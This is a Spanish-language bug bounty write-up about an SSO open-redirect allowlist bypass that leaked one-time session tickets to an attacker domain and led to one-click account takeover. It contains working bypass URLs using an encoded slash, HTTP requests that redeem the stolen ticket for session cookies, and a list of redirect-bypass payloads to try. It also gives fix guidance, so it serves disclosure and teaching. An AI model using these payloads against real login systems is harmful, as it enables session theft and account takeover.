---
title:       "No era un open redirect: era la sesión de la víctima saliendo por la puerta"
summary:     "Un parámetro `host` del SSO aceptaba dominios ajenos si les pegabas una barra en el sitio justo. Lo que se iba al dominio del atacante no era al usuario: era su ticket de sesión. Un clic y la cuenta cambia de dueño."
date:        2026-11-11 20:10:00 +0100
lang:        es
ref:         open-redirect-sso-ticket

severity:    high
cvss:        "8.1"
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N"
cwe:         "CWE-601 · CWE-287"
vuln_class:  "Autenticación"
target_type: "SSO web"
platform:    "YesWeHack"
status:      "Corregido"
tags:        [open-redirect, sso, ato, sesion, cookies, bypass-de-lista-blanca]

takeaways:
  - "Un *open redirect* vale poco. Un *open redirect* que arrastra una credencial en la URL vale una cuenta."
  - "Comparar dominios como texto es el error: `atacante.com/.marca.com` **contiene** `.marca.com` y no tiene nada que ver con él."
  - "Antes de celebrar, comprueba que el parámetro está validado de verdad: si una entrada inválida se rechaza y la tuya pasa, has encontrado un bypass, no un campo abierto."
  - "El ticket debe estar atado al destino que lo pidió. Si vale en cualquier sitio, cualquier sitio puede gastarlo."
---

Este es, de todos los que he publicado, el que más me cambió la forma de mirar. Porque
empezó pareciendo el fallo más aburrido del catálogo —un *open redirect*, de los que
muchos programas ni aceptan— y terminó siendo **la toma de la cuenta con un clic**.

<div class="warn" markdown="1">
**Todo está anonimizado.** Publicado con permiso del programa y sin identificar al
producto: empresa, dominios, nombres de cookies y de parámetros están cambiados. El
mecanismo y la cadena son exactos.
</div>

## El punto de partida

Un sistema de **inicio de sesión único** (SSO): esa página del fabricante por la que pasas
para entrar en cualquiera de sus servicios. Tú escribes la contraseña una vez, el SSO te
devuelve a la aplicación que la pidió, y esa aplicación te da la sesión.

Para saber a dónde devolverte, el SSO acepta un parámetro en la URL:

```
https://sso.ejemplo.tld/doLogin?host=app.ejemplo.tld
```

<div class="plain" markdown="1">
**En cristiano:** `host` es el «¿a dónde te mando cuando termines?». Es un parámetro que
viaja en el enlace, así que lo escribe quien hace el enlace. Y quien hace el enlace puede
ser cualquiera.
</div>

## Primer intento: rechazado (y eso es buena noticia)

Lo primero que prueba todo el mundo es poner su propio dominio:

```
https://sso.ejemplo.tld/doLogin?host=atacante-ejemplo.com
```

Respuesta: **rechazado**, con un código de error interno. El servidor no se traga cualquier
cosa.

<div class="plain" markdown="1">
**En cristiano:** aquí mucha gente cierra la pestaña y se va. Yo hago lo contrario: que
**rechace** significa que hay un control, y un control es algo que se puede **estudiar**.
Si me hubiera aceptado el dominio a la primera, sería un fallo trivial. Que me rechace
convierte la pregunta en una mucho mejor: *¿qué regla exacta está aplicando?*
</div>

Y esa pregunta es la que paga.

## Cómo se rompe una lista blanca que compara texto

La forma más común de validar un dominio —y la más rota— es preguntar *«¿el texto termina
en `.marca.com`?»* o, peor, *«¿lo contiene?»*.

Suena razonable. Falla por una razón sutil: **una URL no es una cadena de texto, es una
estructura**, y el navegador la parte por sitios que una comparación de texto ignora.

Mira estas tres y piensa cuál es el servidor de destino:

| URL | A dónde va el navegador |
|---|---|
| `https://app.marca.com/` | a `app.marca.com` ✅ |
| `https://atacante.com/.marca.com` | a **`atacante.com`** ⚠ |
| `https://atacante.com%2F.marca.com` | a **`atacante.com`** ⚠ |

<div class="plain" markdown="1">
**En cristiano:** el navegador decide el destino con lo que hay **antes de la primera
barra**. Todo lo que viene después es la ruta, el «dentro de» ese sitio. Así que
`atacante.com/.marca.com` es una página llamada `.marca.com` dentro del servidor del
atacante.

Pero si el servidor solo mira si el texto *contiene* `.marca.com`... lo contiene. Pasa el
control. Y te manda a casa del atacante.
</div>

El `%2F` del tercer ejemplo es la barra escrita en código de URL. Sirve para colarla en
sitios donde una barra normal sería rechazada antes de llegar a la comprobación.

Esa fue la llave:

```
https://sso.ejemplo.tld/doLogin?host=atacante-ejemplo.com%2F.marca-ejemplo.com
```

Aceptado. Redirección al dominio del atacante.

## Y aquí es donde deja de ser un open redirect

Un *open redirect* a secas es poca cosa: mandas a alguien a una web que no esperaba. Sirve
para *phishing*, y muchos programas ni lo pagan.

Lo que convierte esto en otra cosa es **qué se lleva la redirección consigo**.

Al completar el salto, el SSO añadía a la URL un **ticket de sesión**: una cadena de un
solo uso que la aplicación legítima canjea para obtener las cookies del usuario. Y ese
ticket se fue, entero, al dominio del atacante:

```
https://atacante-ejemplo.com/.marca-ejemplo.com?ticket=a1b2c3d4e5f6...
```

<div class="plain" markdown="1">
**En cristiano:** imagina que el portero del edificio, en vez de acompañarte a tu piso, le
da **la llave** a quien le diga una dirección parecida a la tuya. No es que te haya mandado
al sitio equivocado: es que ha entregado la llave por el camino.

Y como el atacante controla ese servidor, lee el ticket en su propio registro de accesos.
Ni siquiera necesita que la víctima haga nada más.
</div>

## El caso de un solo clic

Hay un detalle que lo empeora mucho. Si la víctima **ya tiene la sesión abierta** —el caso
normal, porque la gente no cierra sesión— no aparece ninguna pantalla de login. El SSO ve
las cookies, da por buena la identidad y emite el ticket **directamente**.

La víctima hace **un clic** en un enlace cuyo dominio visible es el del fabricante de
verdad. No escribe contraseña. No ve nada raro. Y el ticket ya está en manos del atacante.

## Canjear el ticket

Desde una sesión completamente limpia —sin cookie ninguna, sin contraseña, otro navegador,
otra máquina— el atacante presenta el ticket robado en el endpoint normal de
autenticación:

```http
GET /auth?ticket=a1b2c3d4e5f6... HTTP/2
Host: api.ejemplo.tld
```

```http
HTTP/2 200 OK
set-cookie: SESSION_ID=...;  USER_ID=...;  USERNAME=...
```

El servidor entrega **las cookies de sesión de la víctima**. El ticket por sí solo
produjo la sesión.

{% comment %} PENDIENTE DE CAPTURA — quita esta linea y la de cierre cuando exista el fichero
<figure>
  <img src="{{ '/assets/img/writeups/open-redirect-sso/01-ticket-canjeado.png' | relative_url }}"
       alt="Petición sin ninguna cookie presentando el ticket robado, y respuesta que establece las cookies de sesión de la víctima">
  <figcaption>Sin cookies, sin contraseña. El ticket basta.</figcaption>
</figure>
{% endcomment %}

## Demostrar el impacto sin pasarse

Tener una cookie no demuestra nada por sí solo. Hay que enseñar **qué abre**. Usé esa
sesión para una única lectura, el perfil del propio usuario:

```http
GET /v3/users/info HTTP/2
Host: api.ejemplo.tld
sessionId: <el de la víctima>
```

Y devolvió sus datos personales **en claro**, incluido el correo completo — mientras que
la propia aplicación, en su interfaz, lo enseña enmascarado.

<div class="plain" markdown="1">
**En cristiano:** la aplicación te muestra `j***@gmail.com` porque considera que el correo
es un dato sensible. La API lo devuelve entero. Esa diferencia es la prueba de que lo que
tengo en la mano no es «una sesión cualquiera»: es **la identidad de esa persona**.
</div>

Y ahí paré. No toqué dispositivos, no modifiqué nada, no entré en nada que no fuera la
cuenta de prueba.

## El control negativo

Tres contrapruebas, y la primera es la que de verdad importa:

| Qué probé | Qué pasó | Qué descarta |
|---|---|---|
| El mismo dominio **sin** la barra: `host=atacante-ejemplo.com` | **Rechazado** | Que el parámetro estuviera abierto: hay un control real y lo que hago es saltármelo |
| Mismo endpoint con un identificador de sesión **inventado** | `401` | Que la API respondiera a cualquiera |
| Mismo endpoint **sin** identificador de sesión | `401` | Que esos datos fueran públicos |

<div class="plain" markdown="1">
**En cristiano:** la primera fila es la joya del reporte. Demuestra que el servidor
**valida** ese parámetro, y que lo único que cambia entre un rechazo y un robo de sesión es
**una barra**. Eso convierte «he puesto mi dominio y funcionó» en «he encontrado cómo
saltarme vuestro control». Son dos reportes muy distintos a ojos de quien los tría.
</div>

## Un regalo extra: la cookie que anulaba la protección

Mirando las cookies que se establecían al canjear el ticket, vi que una de ellas llevaba
**el mismo identificador de sesión en claro** y, a diferencia de la principal, **sin la
marca `HttpOnly`**.

<div class="plain" markdown="1">
**En cristiano:** `HttpOnly` es una etiqueta que le dice al navegador *«este valor no se lo
enseñes a JavaScript»*. Sirve para que un fallo de tipo XSS no pueda robar la sesión.

Pero si el **mismo** identificador viaja también en una segunda cookie sin esa etiqueta, la
protección de la primera no vale nada: cualquier script lo lee de la otra. Es cerrar una
puerta con llave y dejar la ventana de al lado abierta.
</div>

## Impacto

<div class="impact" markdown="1">
**Impacto.** Toma de control total de la cuenta a partir de **un solo clic** de la víctima,
en un enlace cuyo dominio visible es el legítimo del fabricante. El atacante obtiene la
sesión completa: datos personales sin enmascarar, correo, identificador de usuario y acceso
al resto de recursos que esa sesión alcanza. No hace falta contraseña, ni segundo factor,
ni que la víctima rellene nada.
</div>

## El arreglo

1. **Dejar de comparar el `host` como texto.** Parsearlo como URL, extraer el dominio
   registrable y compararlo **exactamente** contra una lista blanca. Rechazar de entrada
   cualquier valor que contenga `/`, `?`, `#`, `\`, `@` o información de usuario.
2. **Atar el ticket al destino que lo pidió.** Un ticket emitido para un origen no debería
   poder canjearse desde otro. Así, aunque alguien consiga desviar la redirección, el
   ticket no le sirve.
3. **Poner `HttpOnly` y `Secure`** a cualquier cookie que lleve el identificador de sesión.
   O, mejor, dejar de meterlo en una segunda cookie.

El punto 2 es el importante: es el que hace que el fallo **no sea explotable** aunque
alguien encuentre otro bypass de la lista mañana. Arreglar solo el 1 es jugar al gato y al
ratón con los parsers de URL, y ese juego lo pierdes siempre.

## Cómo buscar esto tú mismo

Cuando veas un parámetro que decide un destino —`host`, `redirect`, `return`, `next`,
`callback`, `url`, `continue`, `dest`—, prueba **en este orden**:

```
1. ?host=atacante.com                    ¿lo acepta a secas?
2. ?host=atacante.com/.marca.com         ¿le vale con que CONTENGA el dominio?
3. ?host=atacante.com%2F.marca.com       ¿y con la barra escapada?
4. ?host=//atacante.com                  ¿interpreta las dos barras como protocolo?
5. ?host=https://marca.com@atacante.com  ¿se queda con lo de antes de la arroba?
6. ?host=marca.com.atacante.com          ¿comprueba solo el principio?
```

Y después, la pregunta que lo cambia todo: **¿la redirección se lleva algo encima?** Mira
la URL final y la cabecera `Referer`. Si ahí viaja un token, un ticket, un código de
autorización o cualquier cosa que parezca una credencial, lo que tienes entre manos no es
un *open redirect*. Es una toma de cuenta.
